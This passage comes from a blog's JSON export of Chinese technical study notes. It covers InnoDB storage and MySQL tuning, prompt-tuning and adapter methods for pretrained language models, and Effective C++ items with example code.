16K。操作系统管理磁盘的最小单位也是页，是操作系统读写磁盘最小单位，Linux中页一般是4K。所以InnoDB从磁盘中读取一个数据页时，操作系统会分4次从磁盘文件中读取数据到内存。写入也是一样的，需要分4次从内存写入到磁盘中。 表空间是 InnoDB 物理存储中的最高层，目前的表空间类别包括： 系统表空间（System Tablespace） 独立表空间（File-per-table Tablespace） 通用表空间（General Tablespace） 回滚表空间（Undo Tablespace） 临时表空间（The Temporary Tablespace） 自适应哈希索引(AHI) 是建立在索引之上的索引。AHI 所作用的目标是索引频繁查询的数据页和索引页，而由于数据页是聚簇索引的一部分，因此 AHI 是建立在索引之上的索引。 数据落盘 修改数据库中页时，页从缓冲池刷新回磁盘的操作并不是在每次页发生更新时都触发，而是通过一种称为CheckPoint的机制刷新回磁盘。 通过定期批量写入磁盘的方式提高写入效率减少磁盘 IO。 内存里缓冲池中的数据页要完成持久化通过两个流程来完成： 脏页落盘：要写的数据 redo log落盘：回滚操作记录 InnoDB采用了Write Ahead Log（WAL）策略和Force Log at Commit机制实现事务级别下数据的 持久性： Force Log at Commit机制：要求当一个事务提交时，所有产生的日志都必须刷新到磁盘上。 Write Ahead Log（WAL）策略：要求数据的变更写入到磁盘前，首先必须将内存中的日志写入到磁盘。 为了确保每次日志都写入到redo日志文件，在每次将redo日志缓冲写入redo日志后，调用一次 fsync 操作，将缓冲文件从文件系统缓存中真正写入磁盘。 Checkpoint 检查什么？ 缩短数据库的恢复时间：当数据库发生宕机时，数据库不需要重做所有的日志，因为Checkpoint之前的页都已经刷新回磁盘。数据库只需对Checkpoint后的redo日志进行恢复，这样就大大缩短了 恢复的时间。 缓冲池不够用时，将脏页刷新到磁盘。 redo日志不可用时，刷新脏页 何为双写？ 写到内存中的double write buffer 写到物理磁盘上共享表空间中连续的128个页，即2个区（extent），大小同样为2MB 崩溃恢复流程： 索引 Hash表： 不支持范围快速查找，范围查找时还是只能通过扫描全表方式。 数据结构比较稀疏，不适合做聚合，不适合做范围等查找。 使用场景，对查询并发要求很高，K/V内存数据库，缓存。 二叉查找树： 查找退化问题，IO次数很多 红黑树： 时间复杂度和树高相关：树有多高就需要检索多少次，每个节点的读取，都对应一次磁盘 IO 操作 平衡二叉树不支持范围查询快速查找，范围查询时需要从根节点多次遍历，查询效率极差。 B树，多叉树优化： 由于每个节点都存储数据，缓存空间占用大 叶子节点也不是相连的，所以不支持范围查询 B+树，只有叶子节点才会存储数据，非叶子节点只存储键值。叶子节点之间使用双向指针连接，最 底层的叶子节点形成了一个双向有序链表。因此优化了B树的缺点。 数据段称为 Leaf node segment，索引段称为 Non-Leaf node segment 索引优化可选方法 覆盖索引 Index Condition Pushdown 频繁出现在where条件中的列，建议创建组合索引 遵循索引最左前缀匹配原则，容易匹配的小范围匹配条件写左边，组合索引应该把频繁用到的列、区分度高的值放在左边 表记录很少不需创建索引 一个表的索引个数不能过多 频繁更新的字段不建议作为索引 区分度低的字段，不建议建索引 在InnoDB存储引擎中，主键索引建议使用自增的长整型，避免使用很长的字段：主键索引树一个页节点就 16K 不能使用无序的值作为索引： 更新数据时会发生频繁的页分裂，页内数据不紧凑，浪费磁盘空间 尽量创建组合索引，而不是单列索引：1个组合索引等同于多个索引效果，节省空间；并且可以使用覆盖索引优化。 LIMIT优化：一般会先排序，然后 limit 限制记录行数 可以使用连接查询（JOIN）代替子查询，连接查询时不需要建立临时表，其速度比子查询 快。 小表驱动大表，建议使用left join时，以小表关联大表，因为使用join的话，第一张表是必须全扫描的，以少关联多就可以减少这个扫描次数 避免全表扫描，mysql在使用不等于(!=或者&lt;&gt;)的时候无法使用索引导致全表扫描。如果对索引使用不等于的操作将会导致索引失效，进行全表扫描。 JOIN两张表的关联字段最好都建立索引，而且最好字段类型是一样的。 WHERE条件中尽量不要使用not in语句（建议使用not exists） 合理利用慢查询日志、explain执行计划查询、show profile（Query Profiler工具）查看SQL执行时的资源使用情况。 MySQL 锁 按功能分： 共享锁(shared lock)，即读锁(read lock) 排他锁(exclusive lock)，也叫写锁(write lock) 按粒度分： 全局锁：锁整database，由MySQL的SQL layer层实现的。 表级锁：锁某table，由MySQL的SQL layer层实现的。 行级锁：锁某行数据，也可锁定行之间的间隙，由某些存储引擎实现（InnoDB） InnoDB行锁是通过给索引上的索引项加锁来实现的。 因此InnoDB这种行锁实现特点意味着：只有通过索引条件检索的数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁。 性能 影响因素： 数据库表结构【对性能影响最大】 低下效率的SQL语句 超大的表 大事务 数据库配置：最大连接数，连接超时，线程缓存，查询缓存，排序缓存，连接查询缓存 数据库整体架构 指标： 响应时间：用户从客户端发出请求，并得到响应，以及展示出来的整个过程的时间 吞吐量 (TPS) ：每秒事务数。一个事务是一个客户端向服务器发送请求，然后服务器做出响应的过程。在没有遇到性能瓶颈时，TPS = 并发数/响应时间 并发用户数：同一时间点，可请求服务器的用户数 资源使用率：CPU 占用率、内存使用率、负载、网络IO 响应时间越短、同时承受的并发数越多、吞吐量会越大、占用的资源越少，则表明系统性能越好。 表结构优化： 将字段很多的表分解成多个表 因为当一个表的数据量很大时，会由于使用频率低的字段的存在而变慢。 增加中间表 增加冗余字段：合理的加入冗余字段可以提高查询速度。表的规范化程度越高，表和表之间的关系越多，需要连接查询的情况也就越多，性能也就越差。 服务器优化： 设置足够大的 innodb_buffer_pool_size ，将数据读取到内存中，物理内存的50%~80% 使用足够大的写入缓存 innodb_log_file_size，降低磁盘写入次数 关闭不需要的log（通用查询日志、慢查询日志、错误日志），降低磁盘写入次数 每提交1次事务同步写到磁盘中，sync_binlog=1，可以设置为n 脏页占innodb_buffer_pool_size的比例时，触发刷脏页到磁盘。innodb_max_dirty_pages_pct=30，推荐值为25%~50%。 后台进程最大IO性能指标。innodb_io_capacity=200，默认200，如果SSD，调整为5000~20000。 全量日志建议关闭。默认关闭。 my.conf或者my.ini文件的[mysqld]组中，常用的参数如下： 12345678910111213141516171819202122232425262728# 01-缓冲区，将数据保存在内存中，保证从内存读取数据。建议innodb_buffer_pool_size设置为总内存大小的3/4或者4/5.innodb_buffer_pool_size=# 02-降低磁盘写入次数。推荐 innodb_log_file_size 设置为 0.25 *innodb_buffer_pool_sizeinnodb_log_file_size=# 03-表示缓冲池字节大小。推荐值为物理内存的50%~80%。innodb_buffer_pool_size=# 04-用来控制redo log刷新到磁盘的策略。innodb_flush_log_at_trx_commit=1# 05-每提交1次事务同步写到磁盘中，可以设置为n。sync_binlog=1# 06-脏页占innodb_buffer_pool_size的比例时，触发刷脏页到磁盘。 推荐值为25%~50%。innodb_max_dirty_pages_pct=30# 07-后台进程最大IO性能指标。默认200，如果SSD，调整为5000~20000innodb_io_capacity=200# 08-指定innodb共享表空间文件的大小。innodb_data_file_path# 09-慢查询日志的阈值设置，单位秒。long_qurey_time=3# 10-mysql复制的形式，row为MySQL8.0的默认形式。binlog_format=row# 11-调高该参数则应降低interactive_timeout、wait_timeout的值。max_connections=200# 12-过大，实例恢复时间长；过小，造成日志切换频繁。innodb_log_file_size# 13-全量日志建议关闭。默认关闭。general_log=0 提升硬件设备，例如选择尽量高频率的内存（频率不能高于主板的支持）、提升网络带宽、使用SSD高速磁盘、提升CPU性能（数量大于频率）等。 对于CPU密集型场景和频繁执行复杂SQL的场景，CPU的频率越高越好。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Database","slug":"Notes/Database","permalink":"https://racleray.github.io/categories/Notes/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"https://racleray.github.io/tags/Database/"},{"name":"MySQL","slug":"MySQL","permalink":"https://racleray.github.io/tags/MySQL/"}],"author":"HeRui"},{"title":"Prompt, Adaptor, ...","slug":"Prompt-Adaptor","date":"2022-04-05T14:57:55.000Z","updated":"2024-01-09T03:12:40.582Z","comments":true,"path":"posts/7695beab.html","link":"","permalink":"https://racleray.github.io/posts/7695beab.html","excerpt":"Prompt and Adaptor and ... Record.","text":"预训练模型没有那么完美，其中两个问题：一，面对数据稀缺的情况，微调效果很可能一般；二，模型参数量大，存储空间占用较大，计算量大。目前相应的对策，效果较好的有：Prompt取代fine-tuning，设计Apdater减少模型训练参数。 Prompt 设计fine-tuning输入模板，让模型根据上下文填充MASK。 Input: [CLS] The spring break is coming soon. [MASK]. the spring break was over? | Label: no Input: [CLS] I am going to have dinner. [MASK]. I am going to eat something? | Label: yes MASK 部分可以是多个词，长度可调。 如何加入任务label信息？通过 verbalizer，将 MASK 部分预测的词与label的单词形成一个map。预测的时候，根据预测的词和map，找到对应的label。 通过预训练model，自己学习处任务相关的 prompt。充分利用预训练信息，这种方式看起来是不错的。 问题来了，怎么确定一个好的 verbalizer mapping ？ PET(Pattern-Exploiting Training) PET 方案（少量样本半监督情景）： 在监督数据上，进行多个Prompt范式tuning，得到多组 prompt 单词，分别对应到相应的label。 在无监督数据上，多个模型进行预测，每个模型分别在各自的 prompt 单词候选集中，进行输出的softmax。多个模型结果取平均，得到soft label。（蒸馏也用这招，一些半监督或者模型精调都有用到这种方法）。 联合监督数据和无监督数据，进行训练得到最终的模型。 iPET (Iterative PET) PET 作者对 PET 的改进版。只是将 PET的三步，进行多轮，同时增大label mapping的范围。实验效果，在小样本场景下是超过 fine-tuning 的。但是，这对比实验，有点不公平。因为是在 fine-tuning 并没精心设计过的条件下的比较。 另外，PET多个模型训练的时间成本和资源消耗明显更高。那么，这些成本转换成对 fine-tuning 方式下，构建人工标注数据的成本呢？又该怎么说？是不是还简单直接一些？ LM-BFF(better few-shot fine-tuning of language models) LM-BFF 则是另一种思路，增加更多的提示信息，输入到model。 将上图改为： 后面加上了一组示例输入，作为一种显示提示。和GPT3的方式有点像。但是LM-BFF对模型进行训练的数据，有梯度更新。GPT3没有梯度更新，只是生成模型的inference提示。 这里的 mapping 设计方式，论文使用了人工设计和模型自己学习推断两种方法。效果这能说相差无几。 Multitask Prompt Multitask Prompt 使用多任务的方式，每个任务设计一个 prompt template，进行学习。然后在模型没有见过的任务上，再进行prompt inference，期望模型实现 zero-shot inference。论文实验结果显示，使用T5或者T0模型进行多任务Prompt，更少的参数量就可以达到甚至超过GPT3的效果。 T0 Prompt repo Other multitask based： SPoT P-tuning v2 参数化 Prompt 设计 verbalizer 显然不够 AI。有研究者就直接时用可训练的 token 来替代 prompt，直接训练 token 对应的特殊的 embedding。 对于 GPT 这种自回归模型，设计 prefix token，加在输入 sentence 之前；对于 T5、BART 这类Encoder-Decoder 模型，在Encoder和Decoder两边加上 prefix-E 和 prefix-D。训练时将原预训练模型参数freeze。 还有像 P-tuning 这样的方法，使用 LSTM 对 Prompt 输入进行额外编码。同时开放 原预训练模型参数进行训练。效果不错，超越了 fine-tuning 效果。但是这个方法训练起来的成本显然比较高。 Tricks prompt 单词使用 label 单词初始化，效果相比随机初始化要好。 Adaptor Parameter-Efficient Fine-tuning，不训练原预训练模型的参数，只训练设计的 Adaptor 结构的参数。 fine-tuning 的想法是训练原模型参数，产生相应任务的有效 hidden representation。但是 Adaptor 是固定原模型参数，设计结构在原 hidden representation 基础上得到任务相关的 hidden representation。 工具库 Adaptor Adaptor 只训练 Adapter 层参数。更少的训练参数，更好的训练效果。 LoRA(Low-Rank Adaptation) LoRA 只在 Feed-forward 层，增加 Low-Rank Adaptation。 Prefix Tuning Prefix Tuning 是 Prompt 中的一种方法，它也是高效训练的一种设计。只更新 Prefix 的参数。 另外，使用了这种形式的 Prompt Tuning 对于多任务训练，有更高的效率。 直接将不同的 prefix 一起多任务训练。这比 PET 这种“老古董模型”效率上强多了。ref 混合型 TOWARDS A UNIFIED VIEW OF PARAMETER-EFFICIENT TRANSFER LEARNING 结合了几种常见方法： 得到更好的效果。另外总结了几种常见的形式。 Early Exit 另一种思路，不是 Adaptor 类型的，但是放在这里一起对比了。 这种方法认为，模型在越高的层的输出存在 over thinking 的可能。所以，考虑提前结束训练，在较低的层就输出。 有几种方法： Multi Exit 在每一层都设置一个输出层，联合每一层输出进行损失计算，并给更高的层更大的权重。最后选择其中一层最为 inference 输出。可以指定某一层。动态输出的方法有下面几种。 Shallow-deep Shallow-deep其中使用方法是，对于每一层分类结果，选择第一个大于某个阈值的层，进行最终输出。 DeeBERT DeeBERT 相比Shallow-deep，只是指标不一样，使用entropy进行比较。 PABEE PABEE 思路比较简单，模型从下往上层，连续输出同一个 label 的次数超过限制，就进行输出。 对于分类任务，次数限制设计为: 回归任务： 其他 Apdaptor 设计方式，在实验中更不易过拟合，并且模型迁移训练效果更好。对于小数据集也有不错的效果。 长序列优化 主要针对 self-attention 在长序列任务上的大计算量进行设计优化。 思路有几种： Longformer, BigBird: 更改attention window，设计局部 attention，空洞 attention，随机 attention，以及只对部分词进行全局 attention，这些方法一起使用。 Reformer：对key 和 query先进性内存聚类，再按簇进行attention。 Linformer：对key进行线性变换，降低key的个数。 Efficient attention，Linear Transformer，Performer：将query和key的矩阵计算，经过一个变量分解，因为长序列这两个的计算量会O(n^2)级变大，而且这是可以通过类似核函数的方法进行分解的。将key和value的计算先进性，有效减少计算量。关键就是这个变换的设计形式。 Synthesizer：不计算得到 attention weights 了，直接设为设计的固定参数矩阵。 MLP-Mixer，Fnet：attention free，直接不attention了，使用其他方式。不同维度全连接层融合，或者转化到“频域”进行融合。 有空整理。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"},{"name":"prompt","slug":"prompt","permalink":"https://racleray.github.io/tags/prompt/"},{"name":"adaptor","slug":"adaptor","permalink":"https://racleray.github.io/tags/adaptor/"}],"author":"HeRui"},{"title":"Effective Cpp","slug":"Effective-Cpp","date":"2022-03-15T13:43:52.000Z","updated":"2024-01-09T10:23:34.187Z","comments":true,"path":"posts/95b1972c.html","link":"","permalink":"https://racleray.github.io/posts/95b1972c.html","excerpt":"Effective Cpp 读书笔记","text":"一、习惯C++ 条款01：视C++为一个语言联邦 C++已经是个多重范型编程语言（multiparadigm programminglanguage），一个同时支持过程形式（procedural）、面向对象形式（object-oriented）、函数形式（functional）、泛型形式（generic）、元编程形式（metaprogramming）的语言。 C++的重要组成：C、Object-Oriented C++、Template C++、STL。 C++是包含四种次语言的一体多面语言，关键看你怎么用。 比如，只在C语言部分，pass-by-value通常比pass-by-reference高效，但在面向对象部分，正好相反，pass-by-reference-to-const是相对更好的选择。 而在STL中，迭代器和函数对象是在C pointer之上，所以pass-by-value更高效。 条款02：尽量以const，enum，inline替换＃define “宁可让编译器替换预处理器”。 对于单纯常量，最好以const对象或enums替换 #define。 对于形似函数的宏（macros），最好改用inline函数替换 #define，避免出错。 #ifdef / #ifndef 继续扮演控制编译的重要角色。 123const double Ratio = 1.5;#define RATIO 1.5 在编译器错误处理时，#define不会告诉你 RATIO 的出现信息，而是被替换的1.5。 enum 可以作为一种in class常量初值设定的方式。这样就取不到成员变量的地址。 12345class Player&#123;private: enum &#123;NumTurns = 5;&#125;; ...&#125;; 条款03：尽可能使用const 如果关键字 const出现在星号左边，表示被指物是常量；如果出现在星号右边，表示指针自身是常量；如果出现在星号两边，表示被指物和指针两者都是常量。 将const实施于成员函数的目的，是为了确认该成员函数可作用于const对象身上。 这一类成员函数之所以重要，基于两个理由。第一，它使 class 接口比较容易被理解。这是因为，得知哪个函数可以改动对象内容而哪个函数不行，很是重要。第二，它使“操作const对象”成为可能。 两个成员函数如果只是常量性（constness）不同，也可以被重载。比如 const T&amp; getXXX() const;和T&amp; getXXX(); 在const成员函数需要被修改的变量，使用mutable修饰。mutable释放掉non-static成员变量的bitwise constness约束。 1234567891011121314151617class CBook&#123; ...public: std::size_t len() const;private: mutable std::size_t length; mutable bool isValid;&#125;;std::size_t len() const&#123; if (!isValid)&#123; length = std::strlen(text); isValid = true; &#125; return length;&#125;; 利用const_cast将常量性移除，可以运用const成员函数实现出其non-const孪生兄弟。当 const和non-const成员函数有着实质等价的实现时，令non-const版本调用const版本可避免代码重复。 123456789101112class CBook&#123;public: const char&amp; operator[] (std::size_t pos) const&#123; ... return text[pos]; &#125; char&amp; operator[] (std::size_t pos) &#123; return const_cast&lt;char&amp;&gt;( static_cast&lt;const CBook*&gt;(*this)[pos]); &#125;&#125;; 另外，将某些东西声明为 const 可帮助编译器侦测出错误用法。const可被施加于任何作用域内的对象、函数参数、函数返回类型、成员函数本体。 条款04：确定对象被使用前已先被初始化 永远在使用对象之前先将它初始化。确保每一个构造函数都将对象的每一个成员初始化。应该尽量使用initialization list。 C++有着十分固定的“成员初始化次序”。base classes更早于其derived classes被初始化（见条款12），而class的成员变量总是以其声明次序被初始化。 为内置型对象进行手工初始化，因为C++不保证初始化它们。 构造函数最好使用成员初值列（member initialization list），而不要在构造函数本体内使用赋值操作（assignment）。initialization list列出的成员变量，其排列次序应该和它们在class中的声明次序相同。 为免除“跨编译单元之初始化次序”问题，请以local static对象替换non-localstatic对象，确保在使用对象前，初始化对象。Singleton模式的一个常见实现手法。 12345678910111213141516171819class FileSys&#123;...&#125;;FileSys&amp; tfs()&#123; static FileSys fs; return fs;&#125;class Dir&#123;...&#125;;Dir::Dir(params)&#123; ... std::size_t disks = tfs().numDisks(); ...&#125;Dir&amp; tmpDir()&#123; static Dir td; return td;&#125; 二、构造/析构/赋值运算 条款05：了解C++默默编写并调用哪些函数 编译器就会为它声明（编译器版本的）一个copy构造函数、一个copy assignment操作符和一个析构函数。此外如果你没有声明任何构造函数，编译器也会为你声明一个default构造函数。所有这些函数都是public且inline （见条款30）。 copy构造函数被用来“以同型对象初始化自我对象”，copy assignment操作符被用来“从另一个同型对象中拷贝其值到自我对象”。copy构造函数是一个尤其重要的函数，因为它定义一个对象如何passed by value 。 编译器可自动为class创建default构造函数、copy构造函数、copyassignment 操作符，以及析构函数。 12345678class Empty&#123;public: Empty() &#123;...&#125;; Empty(const Empty&amp; rhs) &#123;...&#125;; ~Empty() &#123;...&#125;; Empty&amp; operator=(const Empty&amp; rhs) &#123;...&#125;;&#125; 条款06：不用默认构造函数时，需要明确即拒绝 明确声明一个成员函数，可以替代编译器默认版本。 或者拒绝编译器默认版本，可将相应的成员函数声明为private并且不予实现。 或者使用delete关键字，明确不使用。 条款07：为多态基类声明virtual析构函数 当derived class经由一个base class指针被删除时，base class若是non-virtual析构函数，则不会执行derived class的析构函数，导致内存泄露。 消除这个问题的做法很简单：给base class一个virtual析构函数。此后删除derived class 对象就会如你想要的那般。 对象需要在运行期决定哪一个virtual函数该被调用。由一个所谓vptr（virtual table pointer）指针指出。vptr指向一个由函数指针构成的数组，称为vtbl（virtual table）；每一个带有virtual函数的class都有一个相应的vtbl。当对象调用某一virtual函数，实际被调用的函数取决于该对象的vptr所指的那个vtbl——编译器在其中寻找适当的函数指针。 析构函数的运作方式是，最深层派生（most derived）的那个class其析构函数最先被调用，然后是其每一个derived class的析构函数被调用。 如果class带有任何virtual函数，它就应该拥有一个virtual析构函数。 Class 的设计目的如果不是作为 base classes 使用，或不是为了具备多态性（polymorphical），就不该声明virtual析构函数。 条款08：别让异常逃离析构函数 析构函数绝对不要吐出异常。如果一个被析构函数调用的函数可能抛出异常，析构函数应该捕捉任何异常，然后不传递或结束程序。否则可能出现不可预知的风险。 如果客户需要对某个操作函数运行期间抛出的异常做出反应，那么 class 应该提供一个普通函数（而非在析构函数中）执行该操作。 123456789101112131415161718192021class DBConn&#123;public: ... void close()&#123; db.close(); // 可能出错 closed=true; &#125; ~DBConn&#123; if (!closed)&#123; try&#123; db.closed(); &#125;catch (...)&#123; ... &#125; &#125; &#125;private: DBConnection db; bool closed = false;&#125; 条款09：绝不在构造和析构过程中调用virtual函数 derived class对象内的base class会在derived class自身被构造之前先构造。所以调用virtual 函数，derived class并为被完全初始化，导致出现参数未初始化错误。 在derived class对象的base class构造期间，对象的类型是 base class 而不是 derived class。不只 virtual 函数会被编译器解析至（resolve to）base class，若使用运行期类型信息（runtime typeinformation，例如dynamic_cast（见条款27）和typeid），也会把对象视为base class类型。 唯一能够避免此问题的做法就是：确定你的构造函数和析构函数都没有（在对象被创建和被销毁期间）调用 virtual 函数。 在构造函数或者析构函数中调用virtual 函数，不会调用到 derived class 层级的函数（只是 base class 那层）。 **条款10：令operator=返回一个 reference to *this** 为了实现“连锁赋值”，赋值操作符必须返回一个reference指向操作符的左侧实参。令赋值（assignment）操作符返回一个reference to *this。 12345678910111213141516171819202122232425class CC&#123;public: CC&amp; operator=(const CC&amp; rhs)&#123; ... return *this; &#125; CC&amp; operator+=(const CC&amp; rhs)&#123; ... return *this; &#125; CC&amp; operator=(int rhs)&#123; ... return *this; &#125; CC&amp; operator++() &#123; ... return *this; &#125; // 后置++，带参，且返回值 const CC operator++(int) &#123; CC tmp = *this; this-&gt;operator++(); return tmp; &#125;&#125; 条款11：在operator=中处理“自我赋值” 欲阻止这种错误，传统做法是藉由operator=最前面的一个“证同测试（identity test）”达到“自我赋值”的检验目的。 在operator=函数内确保代码不但“异常安全”而且“自我赋值安全”的一个替代方案是，使用所谓的copy and swap技术。不仅解决了代码复用，还保证了赋值操作的安全性。 123456789101112131415161718192021222324252627template &lt;typename T&gt;class Matrix &#123; ... friend void swap(Matrix &amp;a, Matrix &amp;b) noexcept &#123; using std::swap; // 这一步允许编译器基于ADL寻找合适的swap函数 swap(a.x, b.x); swap(a.y, b.y); swap(a.data, b.data); &#125; ...&#125;;Matrix&lt;T&gt;&amp; Matrix&lt;T&gt;::operator=(const Matrix &amp;rhs)&#123; // 检测自赋值 if (&amp;rhs == this) &#123; return *this; &#125; Matrix tmp = rhs; // copy swap(tmp, *this); // swap return *this;&#125;// 甚至于 move and swapMatrix&lt;T&gt;&amp; Matrix&lt;T&gt;::operator=(Matrix2 &amp;&amp;rhs) noexcept &#123; Matrix2 tmp&#123;std::forward&lt;Matrix2&gt;(rhs)&#125;; swap(*this, tmp); return *this;&#125; 条款12：复制对象时勿忘其每一个成分 如果你为class添加一个成员变量，你必须同时修改copy函数。你也需要修改class的所有构造函数（见条款4和条款45）以及任何非标准形式的operator=。 derived class必须复制其base class成分。那些成分往往是private（见条款22），所以你无法直接访问它们，应该让derived class的copy函数调用相应的base class函数。 当你编写一个copy函数，请确保复制所有 local 成员变量，调用所有 base classes 内的适当的copy函数。 注意，copy构造函数和copy assignment操作符，可以提取公共操作，但是不能互相嵌套使用。 1234567891011121314151617181920212223242526272829class Base&#123;private: string name;&#125;class Derived: public Base&#123;public: ... Derived(const Derived&amp; rhs); Derived&amp; operator=(const Derived&amp; rhs); ...private: int priority;&#125;Derived::Derived(const Derived&amp; rhs) :Base(rhs), priority(rhs.priority)&#123; ... &#125;// copyDerived&amp;Derived::operator=(const Derived&amp; rhs)&#123; ... Base::operator=(rhs); priority = rhs.priority; return *this;&#125; 三、资源管理 C++程序中最常使用的资源就是动态分配内存，但内存只是你必须管理的众多资源之一。其他常见的资源还包括文件描述符（file descriptors）、互斥锁（mutex locks）、图形界面中的字型和笔刷、数据库连接、以及网络sockets。 条款13：以对象管理资源 把资源放进对象内， C++的“析构函数自动调用机制”确保资源被释放。 获得资源后立刻放进管理对象（managing object）内。“以对象管理资源”常被称为“资源取得时机便是初始化时机”（Resource Acquisition Is Initialization；RAII），几乎总是在获得资源后于同一语句内用它初始化某个管理对象。 管理对象（managing object）运用析构函数确保资源被释放。不论控制流如何离开区块，一旦对象被销毁，其析构函数会被自动调用。 为防止资源泄漏，请使用RAII对象，它们在构造函数中获得资源并在析构函数中释放资源 两个常被使用的RAII classes分别是 std::shared_ptr 和 std::auto_ptr。前者通常是较佳选择，因为其copy行为比较直观。若选择auto_ptr，复制动作会使 被复制的ptr 指向null。 由于 std::shared_ptr 和 std::auto_ptr 内部析构使用的是 delete 而不是 delete[]，所以以下代码是个错误： 123std::auto_ptr&lt;std::string&gt; aps(new std::string[10]);std::shared_ptr&lt;std::string&gt; aps2(new std::string[10]); 别对动态分配而得到的array使用 std::shared_ptr 和 std::auto_ptr。 条款14：复制RAII对象需要注意 复制 RAII 对象必须一并复制它所管理的资源，所以资源的 copying 行为决定RAII对象的 copying 行为。 处理方法根据对象及其资源的特点决定。 禁止复制 123class Lock: private Uncopyable &#123; ...&#125; 对资源进行引用计数。使用 std::shared_ptr（同时可以用 deleter 参数传入 function object，控制计数为0时的行为）。 123456789class Lock&#123;public: explicit Lock(Mutex* pm): mutexPtr(pm, unlock)&#123; // unlock 为 deleter lock(mutexPtr.get()); &#125;private: std::shared_ptr&lt;Mutex&gt; mutexPtr;&#125; 深拷贝资源 转移资源拥有权，比如使用 std::auto_ptr 条款15：在资源管理类中提供对原始资源的访问 APIs往往要求访问原始资源（raw resources），所以每一个RAII class应该提供一个“访问原始资源”的办法。 对原始资源的访问可能经由显式转换或隐式转换。一般而言显式转换比较安全，隐式转换更灵活。 条款16：成对使用new和delete时要采取相同形式 当你使用 new，有两件事发生。第一，内存被分配出来（通过名为operator new的函数，见条款49和条款51）。第二，此内存区域会有一个或多个构造函数被调用。 当你使用 delete，也有两件事发生：第一，资源内存会有一个或多个析构函数被调用；第二，内存才被释放（通过名为operator delete的函数，见条款51）。 如果你在new表达式中使用[]，必须在相应的delete表达式中也使用[]。如果你在new表达式中不使用[]，一定不要在相应的delete表达式中使用[]。 12345678910string* p1 = new string;delete p1;string* p2 = new string[10];delete[] p2;typedef string Def[3];string* p3 = new Def;delete[] p3; 条款17：以独立语句将newed对象置入智能指针 理由是C++编译器处理事件顺序的不确定性。 比如，process传入Widget的ptr，和一个priority()函数： 1process(std::shared_ptr&lt;Widget&gt;(new Widget), priority()); 执行顺序中，在 new 和 shared_ptr 构造函数执行时，priority()的执行出现异常，那么new的对象可能导致资源泄露。 以独立语句将 newed对象存储于（置入）智能指针内。正确方法： 1234// 1std::shared_ptr&lt;Widget&gt; pw(new Widget);// 2process(pw, priority()); 四、设计与声明 条款18：让接口容易被正确使用，不易被误用 “促进正确使用”的办法包括：接口的一致性，与内置类型的行为兼容。 “阻止误用”的办法包括：建立新类型时限制类型上的不必要操作，不让使用者负责资源管理。 std::shared_ptr 支持定制 custom deleter。可被用来自动解除互斥锁（mutexes；见条款14）。 条款19：设计class犹如设计type 设计高效的classes必须了解你面对的问题： 真的需要一个新type吗？如果只是为既有的class添加一些功能，是否单纯定义一或多个non-member函数或templates，就能够达到目的？。 新type的对象应该如何被创建和销毁？即class的构造函数、析构函数、内存分配函数和释放函数（operator new，operator new[]，operator delete和operator delete[]）的设计。 对象的初始化和对象的赋值有什么样的差别？这决定了构造函数和赋值操作符（operator=）的行为差异。别混淆了“初始化”和“赋值”。 新type的对象如何被passed by value？即如何设计copy constructor。 考虑type成员变量的取值合法范围。 新type 的继承关系如何？是否继承自虚基类，是否会被新子类继承，析构函数是否需要为virtual？。 新type需要什么样的类型转换？若允许类型 T1 被隐式转换为T2，就必须在 class T1 内写一个类型转换操作符（operator T2）或在 class T2 内写一个 non-explicit-one-argument 的构造函数（即，Ctor(int arg1, int arg2=1):m_arg1(arg1),m_arg2(arg2) {}）。如果你只允许 explicit 构造函数存在，就得写出专门负责执行转换的构造函数，且不能是类型转换操作符（type conversion operators, 即operator T2）或 non-explicit-one-argument 构造函数。 什么样的操作符和函数对此新 type 而言是合理的？即，需要为class声明哪些member函数，哪些外部全局函数。 哪个成员为 public，哪个为protected，哪个为 private，哪一个 classes 和/或 functions 应该是friends？ 新type有是否需要是个class template？。 条款20：宁以pass by reference to const替换pass by value 默认情况下C++以pass by value方式（一个继承自C的方式）传递对象至函数。默认函数参数都是以实参的副本为初值，而调用端所获得的也是函数返回值的一个副本，由对象的copy 构造函数生成，这可能使得pass by value成为费时的操作。 pass by reference to const这种传递方式，没有任何构造函数或析构函数被调用，因为没有任何新对象被创建。 以by reference方式传递参数也可以避免slicing（对象切割）问题。当一个derived class对象以by value方式传递并被视为一个base class对象，base class的copy构造函数会被调用，而没有初始化derived class的部分。 尽量以pass-by-reference-to-const替换pass-by-value。前者通常比较高效，并可避免切割问题（slicing problem）。 以上规则并不适用于内置类型，以及 STL 的迭代器和函数对象。对它们而言，pass-by-value往往比较适当。STL的迭代器和函数是基于C指针实现的。 条款21：必须返回对象时，别返回其reference 绝对不要返回pointer或reference指向一个local stack对象 绝对不要返回reference指向一个heap-allocated对象 条款22：将成员变量声明为private 从封装的角度观之，其实只有两种访问权限：private（提供封装）和其他（不提供封装）。 切记将成员变量声明为private。 protected并不比public更具封装性。 条款23：宁以non-member、non-friend替换member函数 宁可拿non-member、non-friend函数替换member函数。这样做可以增加封装性、包装弹性（packaging flexibility）和可扩展性。 条款24：若所有参数皆需类型转换，请为此采用non-member函数 如果你需要为某个成员函数的所有参数（包括this指针参数）进行类型转换，那么这个函数必须是个non-member。const T operator*(const T&amp; lhs, const T&amp; rhs) 。 条款25：考虑写出一个不抛异常的swap函数 当std::swap对你的类型效率不高时，提供一个swap成员函数，并确定这个函数不抛出异常。 如果你提供一个member swap，也该提供一个non-member swap用来调用前者。 调用swap时应针对std::swap使用using声明式，然后调用swap并且不带任何“命名空间资格修饰”。 为“用户定义类型”进行std templates全特化是好的，但千万不要更改std::swap原来的实现。 五、实现 条款26：尽可能延后变量定义式的出现时间 尽可能延后变量定义式的出现，尽可能在使用变量前定义变量，尽可能在变量赋初值时定义变量。这样做可增加程序的清晰度并改善程序效率。 条款27：尽量少做转型动作 const_cast 通常被用来将对象的常量性转除（cast away the constness）。它也是唯一有此能力的C++-style转型操作符。 dynamic_cast 主要用来执行“安全向下转型”（safe downcasting），也就是用来决定某对象是否归属继承体系中的某个类型。它是唯一可能耗费重大运行成本的转型动作。 reinterpret_cast 